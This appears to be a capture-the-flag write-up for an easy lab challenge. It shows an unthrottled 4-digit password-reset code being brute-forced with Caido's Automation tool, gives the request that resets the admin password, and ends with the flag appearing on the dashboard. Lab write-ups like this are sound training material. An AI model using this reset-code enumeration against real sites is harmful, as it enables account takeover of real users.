---

Name: Heartwood Outfitters
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/02/spare-key
Description: Heartwood's site was built in a long weekend by a co-founder who reads more about fly-fishing than web security. The reset flow uses a short numeric code (because the previous one with hex tokens "confused a few customers"). The verify endpoint has no rate-limit, no captcha, and no lockout, so the 10000-code space is fully enumerable. 

---

First, we find several email addresses exposed by the application:
```text
Wholesale      admin@heartwood-outfitters.example
Repair desk    repairs@heartwood-outfitters.example
Press          press@heartwood-outfitters.example
```

The password reset functionality immediately catches our attention:
```
If test@gmail.com is on file with us, we just sent a 4-digit reset code there.
```

A 4-digit code only has 10,000 possible values, from 0000 to 9999.

The description also tells us that the verification endpoint has no rate limiting, CAPTCHA, or account lockout, meaning the entire code space can be brute-forced.

We can filter the responses using:
```
resp.raw.ncont:"Invalid email"
```

I then used Caido's Automation tool to brute-force the 4-digit reset code.

After waiting for the attack to complete, the valid code turned out to be:
```
9993
```

The successful request was:
```
email=admin@heartwood-outfitters.example&code=9993&password=admin
```

The server responded with a redirect to the account dashboard:

```html
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/account/dashboard">/account/dashboard</a>. If not, click the link.
```

This confirms that the password was successfully reset.

We can now log in to the admin account using the newly set password and access:
```
/account/dashboard
```

The flag is displayed on the dashboard.
